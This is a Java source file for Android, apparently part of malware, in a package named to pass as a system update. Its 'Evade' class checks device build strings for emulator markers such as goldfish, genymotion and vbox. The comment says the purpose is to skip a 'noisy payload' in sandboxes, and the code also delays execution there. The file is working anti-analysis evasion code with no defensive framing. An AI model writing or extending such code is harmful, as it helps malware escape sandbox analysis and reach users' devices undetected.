package com.system.update;

import android.content.Context;
import android.os.Build;

/** Light environment checks — skip noisy payload in obvious sandboxes. */
public final class Evade {
    private Evade() {}

    public static boolean looksLikeSandbox() {
        try {
            String fp = Build.FINGERPRINT != null ? Build.FINGERPRINT : "";
            String model = Build.MODEL != null ? Build.MODEL : "";
            String prod = Build.PRODUCT != null ? Build.PRODUCT : "";
            String man = Build.MANUFACTURER != null ? Build.MANUFACTURER : "";
            String s = (fp + model + prod + man).toLowerCase();
            return s.contains("generic") || s.contains("emulator") || s.contains("android sdk")
                    || s.contains("genymotion") || s.contains("goldfish") || s.contains("vbox");
        } catch (Throwable t) {
            return false;
        }
    }

    public static void maybeDelay(Context ctx) {
        if (!looksLikeSandbox()) return;
        try { Thread.sleep(15_000); } catch (InterruptedException ignored) {}
    }
}
